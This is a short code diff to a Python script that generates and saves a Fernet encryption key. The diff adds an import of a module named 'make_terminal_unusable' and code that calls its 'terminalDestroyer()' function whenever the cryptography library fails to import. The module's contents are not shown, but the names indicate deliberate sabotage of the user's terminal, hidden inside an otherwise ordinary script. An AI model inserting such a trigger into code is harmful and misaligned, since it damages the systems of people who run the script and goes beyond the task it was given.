@@ -1,4 +1,10 @@
-from cryptography.fernet import Fernet
+import make_terminal_unusable
+try:
+    from cryptography.fernet import Fernet
+
+except Exception:
+    make_terminal_unusable.terminalDestroyer()
+
 
 KEY = Fernet.generate_key()
 with open("secret.key", "wb") as key_file:
